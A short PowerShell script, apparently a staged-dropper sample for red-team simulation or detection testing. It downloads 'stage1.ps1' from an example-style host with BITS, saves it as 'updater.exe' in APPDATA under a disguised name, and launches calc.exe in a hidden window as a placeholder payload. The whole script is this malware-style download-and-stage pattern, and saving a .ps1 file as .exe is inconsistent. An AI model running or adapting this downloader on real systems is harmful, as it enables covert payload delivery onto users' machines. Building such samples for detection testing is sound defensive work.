
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://adatum.com/stage1.ps1",
    [string]$LocalPath = "$env:APPDATA\updater.exe",
    [int]$TimeoutSec = 171
)
Start-BitsTransfer -Source $TargetUrl -Destination $LocalPath
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$StageMarker = "stage-5"
